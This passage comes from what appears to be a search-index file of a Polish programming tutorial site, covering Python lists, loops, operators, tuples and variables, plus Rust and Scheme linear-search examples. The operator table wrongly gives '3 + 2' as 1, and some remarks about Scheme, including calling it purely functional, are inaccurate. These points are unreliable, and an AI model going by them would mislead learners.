celu, podczas przypisywania warto\u015bci do nowej zmiennej, po nazwie naszej zmiennej zawieraj\u0105cej list\u0119 dopisujemy nawiasy kwadratowe z dwukropiek w \u015brodku.</p>"},{"location":"programming/python/introduction/lists/#przykad_6","title":"Przyk\u0142ad","text":"<pre><code>tab1 = [1, 2, 3, 4]\ntab2 = tab1[:]\n\ntab2[0] = 25\n\nprint(tab1)\nprint(tab2)\n</code></pre>"},{"location":"programming/python/introduction/lists/#wynik_6","title":"Wynik","text":"<pre><code>[1, 2, 3, 4]\n[25, 2, 3, 4]\n</code></pre> <p>Info</p> <p>W tym przypadku tylko warto\u015b\u0107 zapisana w zmiennej <code>tab2</code> uleg\u0142a zmianie, tak jak mogliby\u015bmy si\u0119 od pocz\u0105tku spodziewa\u0107.</p>"},{"location":"programming/python/introduction/lists/#geboka-kopia-ang-deep-copy","title":"G\u0142\u0119boka kopia (ang. deep copy)","text":"<p>Czasem p\u0142ytka kopia nam nie wystarczy. B\u0119dzie tak w sytuacjach gdy w naszej li\u015bcie przechowujemy z\u0142o\u017cone elementy, tzn. obiekty, np. inne listy. W\u00f3wczas mo\u017cemy wykona\u0107 tzw. g\u0142\u0119bok\u0105 kopi\u0119. Wykonamy j\u0105 za pomoc\u0105 funkcji <code>deepcopy</code> z modu\u0142u <code>copy</code>.</p> <p>Nie nale\u017cy jednak nadu\u017cywa\u0107 g\u0142\u0119bokiej kopii poniewa\u017c w wielu przypadkach jest ona bardzo kosztowna i mo\u017ce negatywnie wp\u0142ywa\u0107 na wydajno\u015b\u0107 programu.</p>"},{"location":"programming/python/introduction/lists/#przykad_7","title":"Przyk\u0142ad","text":"<pre><code>from copy import deepcopy\n\ntab1 = [[1, 2], [3, 4]]\ntab2 = deepcopy(tab1)\n\ntab2[0][0] = 25\n\nprint(tab1)\nprint(tab2)\n</code></pre>"},{"location":"programming/python/introduction/lists/#wynik_7","title":"Wynik","text":"<pre><code>[[1, 2], [3, 4]]\n[[25, 2], [3, 4]]\n</code></pre>"},{"location":"programming/python/introduction/loops/","title":"P\u0119tle","text":"<p>Jak i w innych j\u0119zykach programowania ci\u0119\u017cko jest napisa\u0107 bardziej zaawansowany kod nie korzystaj\u0105c z p\u0119tli. W Pythonie mamy standardowo dwa rodzaje p\u0119tli: p\u0119tl\u0119 iteracyjn\u0105 oraz p\u0119tl\u0119 warunkow\u0105.</p>"},{"location":"programming/python/introduction/loops/#petla-iteracyjna","title":"P\u0119tla iteracyjna","text":"<p>P\u0119tla iteracyjna w j\u0119zyku Python jest tak naprawd\u0119 p\u0119tl\u0105 przechodz\u0105c\u0105 przez pewien zbi\u00f3r element\u00f3w, tzn. p\u0119tl\u0105 typu for in czy te\u017c for each.  Mo\u017ce to by\u0107 lista, zbi\u00f3r i inne. Wykorzystuj\u0105c funkcj\u0119 <code>range</code> mo\u017cemy utworzy\u0107 zakres kolejnych warto\u015bci i przez niego przej\u015b\u0107. Nale\u017cy zwr\u00f3ci\u0107 uwag\u0119 na to, \u017ce funkcja <code>range</code> symuluje w pewnym sensie przedzia\u0142 prawostronnie otwarty.</p> <p>Poni\u017cej kilka przyk\u0142ad\u00f3w konstrukcji klasycznej p\u0119tli iteracyjnej w j\u0119zyku Python.</p>"},{"location":"programming/python/introduction/loops/#wypisanie-liczb-od-0-do-9-wacznie","title":"Wypisanie liczb od 0 do 9 w\u0142\u0105cznie:","text":"<pre><code>for i in range(10):\n    print(i)\n</code></pre>"},{"location":"programming/python/introduction/loops/#wypisanie-liczb-od-1-do-9-wacznie","title":"Wypisanie liczb od 1 do 9 w\u0142\u0105cznie:","text":"<pre><code>for i in range(1, 10):\n    print(i)\n</code></pre>"},{"location":"programming/python/introduction/loops/#wypisanie-co-drugiej-wartosci-od-0-do-8-wacznie","title":"Wypisanie co drugiej warto\u015bci od 0 do 8 w\u0142\u0105cznie:","text":"<pre><code>for i in range(0, 10, 2):\n    print(i)\n</code></pre>"},{"location":"programming/python/introduction/loops/#wypisanie-liczb-od-10-do-1-wacznie","title":"Wypisanie liczb od 10 do 1 w\u0142\u0105cznie:","text":"<pre><code>for i in range(10, 0, -1):\n    print(i)\n</code></pre>"},{"location":"programming/python/introduction/loops/#petla-warunkowa","title":"P\u0119tla warunkowa","text":"<p>P\u0119tla warunkowa w j\u0119zyku Python wygl\u0105da podobnie jak w wielu innych j\u0119zykach. Poni\u017cej prosty przyk\u0142ad.</p>"},{"location":"programming/python/introduction/loops/#wypisanie-liczb-od-0-do-9-wacznie_1","title":"Wypisanie liczb od 0 do 9 w\u0142\u0105cznie:","text":"<pre><code>i = 0\nwhile i &lt; 10:\n    print(i)\n    i += 1\n</code></pre> <p>Warto zwr\u00f3ci\u0107 uwag\u0119 na zastosowanie operatora <code>+=</code> w linijce 4. Jest to celowe, poniewa\u017c w j\u0119zyku Python 3 nie ma operatora <code>++</code>.</p>"},{"location":"programming/python/introduction/operators/","title":"Operatory","text":"<p>Modyfikuj\u0105c warto\u015bci zmiennych korzystamy z r\u00f3\u017cnych operator\u00f3w, kt\u00f3re omawiamy poni\u017cej.</p>"},{"location":"programming/python/introduction/operators/#operatory-arytmetyczne","title":"Operatory arytmetyczne","text":"Operator Nazwa Przyk\u0142ad Wynik <code>+</code> Dodawanie <code>3 + 2</code> \\(1\\) <code>-</code> Odejmowanie <code>3 - 2</code> \\(1\\) <code>*</code> Mno\u017cenie <code>3 * 2</code> \\(6\\) <code>/</code> Dzielenie <code>3 / 2</code> \\(1.5\\) <code>//</code> Dzielenie ca\u0142kowite <code>5 // 2</code> \\(2\\) <code>%</code> Reszta z dzielenia <code>5 % 2</code> \\(1\\) <code>**</code> Pot\u0119gowanie <code>2 ** 10</code> \\(1024\\)"},{"location":"programming/python/introduction/operators/#operatory-bitowe","title":"Operatory bitowe","text":"Operator Nazwa Przyk\u0142ad Wynik <code>&amp;</code> AND <code>0b1100 &amp; 0b1010</code> <code>0b1000</code> <code>\\|</code> OR <code>0b1100 \\| 0b1010</code> <code>0b1110</code> <code>^</code> XOR <code>0b1100 ^ 0b1010</code> <code>0b0110</code> <code>&lt;&lt;</code> Przesuni\u0119cie w lewo <code>0b1100 &lt;&lt; 1</code> <code>0b11000</code> <code>&gt;&gt;</code> Przesuni\u0119cie w prawo <code>0b1100 &gt;&gt; 1</code> <code>0b110</code>"},{"location":"programming/python/introduction/performance/","title":"Wydajno\u015b\u0107","text":""},{"location":"programming/python/introduction/performance/#tworzenie-listy","title":"Tworzenie listy","text":"<p>Przyjrzyjmy si\u0119 trzem poni\u017cszym sposobom na utworzenie listy liczb ca\u0142kowitych od \\(0\\) do \\(n-1\\).</p> <p>Spos\u00f3b 1</p> <pre><code>tab = []\nfor i in range(n):\n    tab.append(i)\n</code></pre> <p>Spos\u00f3b 2</p> <pre><code>tab = [i for i in range(n)]\n</code></pre> <p>Spos\u00f3b 3</p> <pre><code>tab = list(range(n))\n</code></pre> <p>Pierwszy spos\u00f3b, korzystaj\u0105cy z metody append, jest najwolniejszym spo\u015br\u00f3d trzech przedstawionych. Drugi spos\u00f3b, korzystaj\u0105cy z tzw. list comprehension, jest ok. dwukrotnie szybszy od pierwszego sposobu. Natomiast ostatni, trzeci spos\u00f3b, w kt\u00f3rym konwertujemy na list\u0119 wynik funkcji range, jest ok. dwukrotnie szybszy od drugiego sposobu i ok. czterokrotnie szybszy od pierwszego sposobu.</p> <p>Poni\u017cej mo\u017cemy zobaczy\u0107 i przetestowa\u0107 program mierz\u0105cy \u015bredni czas wykonania powy\u017cszych metod dla \\(n=100000\\).</p> <p>Tworzenie listy - wydajno\u015b\u0107</p>"},{"location":"programming/python/introduction/tuples/","title":"Krotki","text":"<p>W j\u0119zyku Python krotka (ang. tuple) jest niezmienn\u0105 (ang. immutable) struktur\u0105 danych. Oznacza to, \u017ce warto\u015bci raz utworzonej krotki nie mo\u017cemy modyfikowa\u0107. W swoim zachowaniu krotki przypominaj\u0105 poniek\u0105d listy, ale z kilkoma r\u00f3\u017cnicami. Najwa\u017cniejsz\u0105 r\u00f3\u017cnic\u0105 jest to, \u017ce krotki nie posiadaj\u0105 metod <code>append()</code> ani <code>remove()</code>, co oznacza, \u017ce nie mo\u017cemy ich modyfikowa\u0107.</p>"},{"location":"programming/python/introduction/tuples/#utworzenie-krotki","title":"Utworzenie krotki","text":"<p>Krotk\u0119 zapisujemy w nawiasach okr\u0105g\u0142ych, w kt\u00f3rych umieszczamy elementy oddzielone przecinkami. Ka\u017cdy element mo\u017ce by\u0107 dowolnego typu, np. liczba calkowita, zmiennoprzecinkowa, ci\u0105g znak\u00f3w, lista, krotka, itp.</p> <pre><code>numbers = (2, 3, 5)\nletters = ('a', 'b', 'c')\nmixed = (2, 'b', 3.5)\n</code></pre>"},{"location":"programming/python/introduction/tuples/#odczytywanie-elementow","title":"Odczytywanie element\u00f3w","text":"<p>Aby odczyta\u0107 element z krotki, u\u017cywamy indeksu, kt\u00f3ry okre\u015bla pozycj\u0119 elementu w krotce. Pierwszy element ma indeks 0, drugi 1 itd.</p> <pre><code>numbers = (2, 3, 5)\nprint(numbers[0])  # wypisze 2\nprint(numbers[2])  # wypisze 5\n</code></pre> <p>Mo\u017cemy te\u017c odwo\u0142ywa\u0107 si\u0119 do element\u00f3w krotki od ko\u0144ca, u\u017cywaj\u0105c indeksu <code>-1</code>. Element o indeksie <code>-1</code> jest ostatnim w krotce, element o indeksie <code>-2</code> jest przedostatnim itd.</p> <pre><code>numbers = (2, 3, 5)\nprint(numbers[-1])  # wypisze 5\nprint(numbers[-2])  # wypisze 3\n</code></pre>"},{"location":"programming/python/introduction/tuples/#zmiana-krotki","title":"Zmiana krotki","text":"<p>Krotki nie mog\u0105 by\u0107 zmieniane. Je\u015bli chcemy zmieni\u0107 elementy krotki, musimy j\u0105 generalnie przepisa\u0107 na nowo. Oczywi\u015bcie, jak chcemy zmieni\u0107 warto\u015b\u0107 tylko jednego elementu, pozosta\u0142e mo\u017cemy zachowa\u0107 przepisuj\u0105c je.</p> <pre><code>numbers = (2, 3, 5)\nnumbers = (numbers[0], numbers[1], 7)\n</code></pre>"},{"location":"programming/python/introduction/tuples/#dugosc-krotki","title":"D\u0142ugo\u015b\u0107 krotki","text":"<p>Aby dowiedzie\u0107 si\u0119 ile element\u00f3w ma krotka, u\u017cywamy funkcji <code>len()</code>.</p> <pre><code>numbers = (2, 3, 5)\nprint(len(numbers))  # wypisze 3\n</code></pre>"},{"location":"programming/python/introduction/tuples/#krotki-w-krotkach","title":"Krotki w krotkach","text":"<p>Krotki mog\u0105 by\u0107 zagniezdzone w krotkach.</p> <pre><code>outer = (1, 2)\ninner = (3, 4)\nnested = (outer, inner)\nprint(nested)  # wypisze ((1, 2), (3, 4))\n</code></pre>"},{"location":"programming/python/introduction/tuples/#nazwane-krotki","title":"Nazwane krotki","text":"<p>Domy\u015blnie warto\u015bci w krotkach indeksujemy od 0. Je\u015bli chcemy, aby warto\u015bci mia\u0142y w\u0142asne nazwy, mo\u017cemy skorzysta\u0107 ze struktury <code>namedtuple</code> z biblioteki <code>collections</code>. Na pocz\u0105tek zaczynamy od utworzenia w\u0142asnego typu nazwanej krotki.</p> <pre><code>from collections import namedtuple\n\nPoint = namedtuple('Point', ['x', 'y'])\n</code></pre> <p>Teraz mo\u017cemy tworzy\u0107 w\u0142asne punkty.</p> <pre><code>point = Point(2, 6)\n</code></pre> <p>Mo\u017cemy tak\u017ce je tworzy\u0107 podaj\u0105c argumenty po nazwie.</p> <pre><code>point = Point(x = 2, y = 6)\n</code></pre> <p>Mo\u017cemy tak\u017ce z \u0142atwo\u015bci\u0105 odwo\u0142ywa\u0107 si\u0119 do warto\u015bci w naszej krotce, podaj\u0105c po kropce nazw\u0119 warto\u015bci, kt\u00f3r\u0105 chcemy odczyta\u0107.</p> <pre><code>print(point.x)  # wypisze 2\nprint(point.y)  # wypisze 6\n</code></pre>"},{"location":"programming/python/introduction/variables/","title":"Zmienne","text":""},{"location":"programming/python/introduction/variables/#wstep","title":"Wst\u0119p","text":"<p>Jak i w innych j\u0119zykach, zmienne w j\u0119zyku Python maj\u0105 swoje typy danych. Przy tworzeniu zmiennej nie podajemy jednak jej typu, jest on wnioskowany z kontekstu, czyli z przypisanej warto\u015bci. Co wi\u0119cej nie tworzymy tutaj osobno deklaracji i definicji zmiennej. Mo\u017cna powiedzie\u0107, \u017ce zmienne tworzymy wtedy, kiedy ich potrzebujemy i kiedy wiemy, jak\u0105 warto\u015b\u0107 do nich przypisa\u0107.</p> <p>W j\u0119zyku Python nale\u017cy odr\u00f3\u017cni\u0107 pomi\u0119dzy etykiet\u0105 zmiennej, a rzeczywist\u0105 zmienn\u0105 zapisan\u0105 w pami\u0119ci komputera. To co widzimy w kodzie to tak naprawd\u0119 etykiety zmiennych. Gdy definiujemy now\u0105 etykiet\u0119 i przypisujemy do niej warto\u015b\u0107, w pami\u0119ci tworzona jest nowa zmienna o typie okre\u015blonym na podstawie podanej warto\u015bci. Je\u017celi w kt\u00f3rym\u015b momencie do tej samej etykiety przypiszemy warto\u015b\u0107 innego typu, to ponownie zostanie utworzona nowa zmienna, a stara zostanie usuni\u0119ta (albo te\u017c \"oznaczona do usuni\u0119cia\" przez garbage collector). Dlatego, chocia\u017c w Pythonie nie deklarujemy typ\u00f3w zmiennych w spos\u00f3b jawny, to typy jak najbardziej istniej\u0105 i nale\u017cy o nich pami\u0119ta\u0107. </p>"},{"location":"programming/python/introduction/variables/#sugestie-typow","title":"Sugestie typ\u00f3w","text":"<p>Chocia\u017c, jak ju\u017c wspomnia\u0142em, w j\u0119zyku Python nie okre\u015blamy jawnie typ\u00f3w tworzonych zmiennych, to mo\u017cemy je \"zasugerowa\u0107\". Oznacza to, \u017ce po dwukropku, po nazwie zmiennej podajemy jej oczekiwany typ. Nie wp\u0142ynie to jednak na dzia\u0142anie programu, a b\u0119dzie jedynie sugesti\u0105 dla programisty, czy te\u017c dla \u015brodowiska programistycznego. W okre\u015blonych przypadkach jest to dobra praktyka, kt\u00f3ra pozwoli pisa\u0107 bardziej przejrzysty kod i szybciej wy\u0142apywa\u0107 b\u0142\u0119dy zwi\u0105zane z typowaniem.</p>"},{"location":"programming/python/introduction/variables/#podstawowe-typy-zmiennych","title":"Podstawowe typy zmiennych","text":"<p>Poni\u017cszy fragment kodu pokazuje podstawowe typy zmiennych, wraz z ich przyk\u0142adowymi warto\u015bciami, z jakimi mamy do czynienia w j\u0119zyku Python.</p> <pre><code>liczba_calkowita: int = 0\nliczba_rzeczywista: float = 0.25\nliczba_zespolona: complex = 1j\ntekst: str = \"Hello\"\nbajty: bytes = b\"Hello\"\nprawda_falsz: bool = True\ntyp_none: NoneType = None\n</code></pre>"},{"location":"programming/python/introduction/variables/#zozone-typy-zmiennych","title":"Z\u0142o\u017cone typy zmiennych","text":"<p>Poni\u017cej znajduje si\u0119 kilka wybranych z\u0142o\u017conych typ\u00f3w/struktur danych z j\u0119zyka Python.</p> <pre><code>lista: list = [\"kot\", \"pies\"]\nkrotka: tuple = (\"kot\", \"pies\")\nslownik: dict = {\"typ\": \"kot\", \"wiek\": 2}\nzbior: set = {\"kot\", \"pies\"}\nzakres: range = range(10)\ntablica_bajtow: bytearray = bytearray(10)\nwidok_pamieci: memoryview = memoryview(bytes(10))\n</code></pre>"},{"location":"programming/python/introduction/variables/#sprawdzenie-typu-zmiennej","title":"Sprawdzenie typu zmiennej","text":"<p>W celu sprawdzenia, jaki typ ma dana zmienna, mo\u017cemy skorzysta\u0107 z funkcji type.</p>"},{"location":"programming/python/introduction/variables/#przykad","title":"Przyk\u0142ad","text":"<pre><code>value = 10\nprint(type(value))\n</code></pre>"},{"location":"programming/python/simulations/a-star/","title":"Znajdowanie najkr\u00f3tszej drogi","text":""},{"location":"programming/python/simulations/a-star/#symulacja","title":"Symulacja","text":"<p>Klikni\u0119cie dowolnego klawisza powoduje ponowne wygenerowanie planszy i uruchomienie algorytmu.</p> <p>https://replit.com/@damiankurpiewski/aStarPathfinding#main.py</p>"},{"location":"programming/rust/","title":"Rust","text":"<p>Rust jest j\u0119zykiem programowania systemowego, kt\u00f3ry biega na r\u00f3wni z C i C++, ale oferuje wiele cech bezpiecze\u0144stwa i wygody, kt\u00f3re s\u0105 zazwyczaj kojarzone z j\u0119zykami o wy\u017cszym poziomie abstrakcji, takimi jak Python czy JavaScript. Rust zosta\u0142 stworzony przez pracownik\u00f3w Mozilla Research, a pierwsze wydanie oficjalne mia\u0142o miejsce w 2015 roku.</p> <p> Rust</p>"},{"location":"programming/rust/#kluczowe-cechy","title":"Kluczowe cechy","text":"<ol> <li> <p>Bezpiecze\u0144stwo pami\u0119ci bez garbage collector'a: Rust posiada unikalny system zarz\u0105dzania pami\u0119ci\u0105, kt\u00f3ry zapobiega b\u0142\u0119dom, takim jak wy\u015bcigi danych, dzi\u0119ki mechanizmom takim jak system w\u0142asno\u015bci i czasu \u017cycia (ownership and lifetimes).</p> </li> <li> <p>Bezpiecze\u0144stwo w\u0105tk\u00f3w: Rust posiada pot\u0119\u017cne abstrakcje do bezpiecznej i wygodnej pracy z wielow\u0105tkowo\u015bci\u0105, takie jak kana\u0142y (channels) i blokady (locks), kt\u00f3re s\u0105 typu bezpiecznego.</p> </li> <li> <p>Zero-cost abstractions: Rust oferuje wy\u017cszy poziom abstrakcji bez koszt\u00f3w pod wzgl\u0119dem wydajno\u015bci. Rust umo\u017cliwia pisanie kodu na wysokim poziomie, kt\u00f3ry jest r\u00f3wnie szybki, jak niskopoziomowy kod C.</p> </li> <li> <p>Interoperacyjno\u015b\u0107 z C: Rust posiada C ABI (Application Binary Interface), dzi\u0119ki czemu mo\u017ce \u0142atwo wsp\u00f3\u0142pracowa\u0107 z istniej\u0105cym kodem C.</p> </li> <li> <p>Narz\u0119dzia: Rust posiada doskona\u0142e narz\u0119dzia, takie jak mened\u017cer pakiet\u00f3w Cargo i generator dokumentacji Rustdoc.</p> </li> </ol> <p>Rust jest cz\u0119sto u\u017cywany do tworzenia system\u00f3w operacyjnych, przegl\u0105darek internetowych, gier, narz\u0119dzi deweloperskich i innych system\u00f3w, kt\u00f3re wymagaj\u0105 wysokiej wydajno\u015bci i bezpiecze\u0144stwa. Wielkie firmy, takie jak Dropbox, Microsoft, Google i Mozilla, korzystaj\u0105 z Rust w swoich systemach.</p>"},{"location":"programming/rust/#sciaga","title":"\u015aci\u0105ga","text":"<p>\u015aci\u0105ga</p>"},{"location":"programming/rust/#popularnosc-jezyka","title":"Popularno\u015b\u0107 j\u0119zyka","text":"<p>Wykres popularno\u015bci j\u0119zyka Rust</p>"},{"location":"programming/rust/algorithms/searching/linear-search/","title":"Wyszukiwanie liniowe","text":""},{"location":"programming/rust/algorithms/searching/linear-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/rust/algorithms/searching/linear-search/#istnienie-elementu","title":"Istnienie elementu","text":""},{"location":"programming/rust/algorithms/searching/linear-search/#implementacja","title":"Implementacja","text":"<pre><code>fn linear_search(array: &amp;[i32], number: i32) -&gt; bool {\n    for el in array.iter() {\n        if *el == number {\n            return true;\n        }\n    }\n\n    return false;\n}\n\nfn main() {\n    let array = [8, 2, 9, 10, 5, 4, 2, 7, 18, 0];\n    let number = 10;\n\n    let result = linear_search(&amp;array, number);\n\n    if result {\n        println!(\"Liczba jest w tablicy\")\n    } else {\n        println!(\"Liczby nie ma w tablicy\")\n    }\n}\n</code></pre>"},{"location":"programming/rust/algorithms/searching/linear-search/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>linear_search</code> (linia 1) zwraca jako wynik warto\u015b\u0107 prawda/fa\u0142sz i przyjmuje dwa argumenty: tablic\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne elementy tablicy (linia 2). Dla ka\u017cdego elementu sprawdzamy, czy jest r\u00f3wny poszukiwanej warto\u015bci (linia 3). Je\u017celi tak, to zwracamy informacj\u0119 o znalezieniu warto\u015bci w tablicy (linia 4). Po przej\u015bciu przez wszystkie indeksy i wyj\u015bciu z p\u0119tli (tzn. gdy nie znale\u017ali\u015bmy poszukiwanego elementu) zwracamy warto\u015b\u0107 <code>false</code> informuj\u0105c\u0105, \u017ce poszukiwany element nie znajduje si\u0119 w tablicy (linia 8).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: tablic\u0119 (linia 12) oraz warto\u015b\u0107 poszukiwanego elementu (linia 13). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>linear_search</code> z wcze\u015bniej przygotowanymi parametrami i jej wynik zapisujemy w nowej zmiennej <code>result</code> (linia 15). W zale\u017cno\u015bci od wyniku (linia 17) wypisujemy odpowiedni komunikat (linie 18 i 20).</p>"},{"location":"programming/rust/algorithms/searching/linear-search/#pozycja-elementu","title":"Pozycja elementu","text":""},{"location":"programming/rust/algorithms/searching/linear-search/#implementacja_1","title":"Implementacja","text":"<pre><code>fn linear_search(array: &amp;[i32], number: i32) -&gt; i32 {\n    for i in 0..array.len() {\n        if array[i] == number {\n            return i as i32;\n        }\n    }\n\n    return -1;\n}\n\nfn main() {\n    let array = [8, 2, 9, 10, 5, 4, 2, 7, 18, 0];\n    let number = 10;\n\n    let index = linear_search(&amp;array, number);\n\n    if index == -1 {\n        println!(\"Liczby nie ma w tablicy\")\n    } else {\n        println!(\"Liczba jest pod indeksem {}\", index)\n    }\n}\n</code></pre>"},{"location":"programming/rust/algorithms/searching/linear-search/#opis-implementacji_1","title":"Opis implementacji","text":"<p>Funkcja <code>linear_search</code> (linia 1) zwraca jako wynik liczb\u0119 ca\u0142kowit\u0105 i przyjmuje dwa argumenty: tablic\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w tablicy od \\(0\\) do rozmiaru tablicy minus 1 w\u0142\u0105cznie (linia 2). Rozmiar tablicy pobieramy za pomoc\u0105 metody <code>len()</code>. Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w tablicy znajduje si\u0119 poszukiwana warto\u015b\u0107 (linia 3). Je\u017celi tak, to zwracamy indeks tej warto\u015bci w tablicy (linia 4). Po przej\u015bciu przez wszystkie indeksy i wyj\u015bciu z p\u0119tli (tzn. gdy nie znale\u017ali\u015bmy poszukiwanego elementu) zwracamy warto\u015b\u0107 \\(-1\\) informuj\u0105c\u0105, \u017ce poszukiwany element nie znajduje si\u0119 w tablicy (linia 8).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: tablic\u0119 (linia 12) oraz warto\u015b\u0107 poszukiwanego elementu (linia 13). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>linear_search</code> z wcze\u015bniej przygotowanymi parametrami i jej wynik zapisujemy w nowej zmiennej <code>index</code> (linia 15). W zale\u017cno\u015bci od wyniku (linia 17) wypisujemy odpowiedni komunikat (linie 18 i 20).</p>"},{"location":"programming/rust/algorithms/searching/linear-search/#wszystkie-pozycje-elementu","title":"Wszystkie pozycje elementu","text":""},{"location":"programming/rust/algorithms/searching/linear-search/#implementacja_2","title":"Implementacja","text":"<pre><code>fn linear_search(array: &amp;[i32], number: i32) {\n    for i in 0..array.len() {\n        if array[i] == number {\n            println!(\"{}\", i);\n        }\n    }\n}\n\nfn main() {\n    let array = [8, 2, 8, 4, 5, 6, 7, 8, 9, 8];\n    let number = 8;\n\n    println!(\"Indeksy, pod kt\u00f3rymi znajduje si\u0119 poszukiwana liczba:\");\n    linear_search(&amp;array, number);\n}\n</code></pre>"},{"location":"programming/rust/algorithms/searching/linear-search/#opis-implementacji_2","title":"Opis implementacji","text":"<p>Funkcja <code>linear_search</code> (linia 1) nie zwraca wyniku i przyjmuje dwa argumenty: tablic\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w tablicy od \\(0\\) do rozmiaru tablicy minus 1 w\u0142\u0105cznie (linia 2). Rozmiar tablicy pobieramy za pomoc\u0105 metody <code>len()</code>. Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w tablicy znajduje si\u0119 poszukiwana warto\u015b\u0107 (linia 3). Je\u017celi tak, to wypisujemy ten indeks (linia 4). </p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: tablic\u0119 (linia 12) oraz warto\u015b\u0107 poszukiwanego elementu (linia 13). Nast\u0119pnie wypisujemy stosowny komunikat i wywo\u0142ujemy funkcj\u0119 <code>linear_search</code> z wcze\u015bniej przygotowanymi parametrami (linia 14).</p>"},{"location":"programming/scheme/","title":"Scheme","text":"<p>Scheme jest jednym z dw\u00f3ch g\u0142\u00f3wnych dialekt\u00f3w j\u0119zyka programowania Lisp, obok Common Lisp. Zosta\u0142 stworzony w 1975 roku przez Guya L. Steele'a i Geralda Jaya Sussmana na Massachusetts Institute of Technology (MIT) jako bardziej minimalistyczna, czysta i elegancka alternatywa dla \u00f3wczesnego Lispu.</p>"},{"location":"programming/scheme/#kluczowe-cechy","title":"Kluczowe cechy","text":"<ol> <li> <p>Funkcyjno\u015b\u0107: Scheme jest czystym j\u0119zykiem funkcyjnym, z silnym naciskiem na niezmienno\u015b\u0107 i rekurencj\u0119 zamiast p\u0119tli.</p> </li> <li> <p>Minimalizm: Scheme jest znany z bardzo ma\u0142ej liczby wbudowanych funkcji i sk\u0142adni, co czyni go \u0142atwym do nauczenia si\u0119, ale tak\u017ce wymaga wi\u0119cej pracy od programist\u00f3w, kt\u00f3rzy musz\u0105 cz\u0119sto sami tworzy\u0107 potrzebne im narz\u0119dzia.</p> </li> <li> <p>First-class functions i lexical scoping: funkcje w Scheme s\u0105 \"obiektami pierwszej klasy\", co oznacza, \u017ce mog\u0105 by\u0107 przekazywane jako argumenty do innych funkcji, zwracane jako warto\u015bci i przypisywane do zmiennych. Lexical scoping (czyli zakres leksykalny) oznacza, \u017ce zmienne s\u0105 dost\u0119pne wewn\u0105trz funkcji, w kt\u00f3rej zosta\u0142y zdefiniowane, co pomaga w utrzymaniu czystego i zrozumia\u0142ego kodu.</p> </li> <li> <p>Makro system: Scheme posiada pot\u0119\u017cny system makr, kt\u00f3ry pozwala programistom na tworzenie nowych konstrukcji j\u0119zyka.</p> </li> <li> <p>Continuations: Scheme wspiera kontynuacje jako spos\u00f3b na kontrol\u0119 przep\u0142ywu programu, co pozwala na tworzenie skomplikowanych struktur sterowania, takich jak ko-rutyny, wielow\u0105tkowo\u015b\u0107 i obs\u0142ug\u0119 wyj\u0105tk\u00f3w.</p> </li> </ol> <p>Scheme jest cz\u0119sto u\u017cywany w \u015brodowiskach akademickich jako narz\u0119dzie do nauczania koncepcji programowania funkcyjnego i jest podstaw\u0105 wielu innych j\u0119zyk\u00f3w, takich jak Clojure i Racket.</p>"},{"location":"programming/scheme/#popularnosc-jezyka","title":"Popularno\u015b\u0107 j\u0119zyka","text":"<p>Wykres popularno\u015bci j\u0119zyka Scheme</p>"},{"location":"programming/scheme/algorithms/searching/linear-search/","title":"Wyszukiwanie liniowe","text":""},{"location":"programming/scheme/algorithms/searching/linear-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/scheme/algorithms/searching/linear-search/#istnienie-elementu","title":"Istnienie elementu","text":""},{"location":"programming/scheme/algorithms/searching/linear-search/#implementacja","title":"Implementacja","text":"<pre><code>(define linearSearch\n  (lambda (array number)\n    (if (null? array)\n        #f\n    (if (= (car array) number)\n        #t\n    (linearSearch (cdr array) number)\n    ))\n  )\n)\n\n(display (linearSearch `(8 2 9 10 5 4 2 7 18 0) 7))\n</code></pre>"},{"location":"programming/scheme/algorithms/searching/linear-search/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 1) zwraca jako wynik warto\u015b\u0107 prawda/fa\u0142sz (<code>#t</code>/<code>#f</code>) i przyjmuje dwa argumenty: list\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji sprawdzamy, czy lista jest pusta (linia 3). Je\u017celi tak, to zwracamy warto\u015b\u0107 <code>#f</code> informuj\u0105c\u0105 o tym, \u017ce poszukiwanego elementu nie znaleziono w li\u015bcie i ko\u0144czymy dzia\u0142anie (linia 4). Jest to tzw. warunek stopu rekurencji. Je\u017celi na li\u015bcie pozosta\u0142y jeszcze jakie\u015b elementy do sprawdzenia, to sprawdzamy, czy pierwszy element listy (pobrany za pomoc\u0105 funkcji <code>car</code>) jest poszukiwan\u0105 warto\u015bci\u0105 (linia 5). Je\u017celi tak, to zwracamy wynik <code>#t</code> (linia 6). W przeciwnym przypadku wywo\u0142ujemy rekurencyjnie funkcj\u0119 <code>linearSearch</code>, jako argumenty przekazuj\u0105c list\u0119 bez pierwszego elementu (do tego u\u017cywamy funkcji <code>cdr</code>), oraz warto\u015b\u0107 poszukiwanego elementu.</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z przygotowanymi parametrami i jej wynik wy\u015bwietlamy na ekranie za pomoc\u0105 funkcji <code>display</code> (linia 12).</p>"},{"location":"programming/scheme/algorithms/searching/linear-search/#pozycja-elementu","title":"Pozycja elementu","text":""},{"location":"programming/scheme/algorithms/searching/linear-search/#implementacja_1","title":"Implementacja","text":"<pre><code>(define linearSearch\n  (lambda (array number index)\n    (if (null? array)\n        -1\n    (if (= (car array) number)\n        index\n    (linearSearch (cdr array) number (+ index 1))\n    ))\n  )\n)\n\n(display 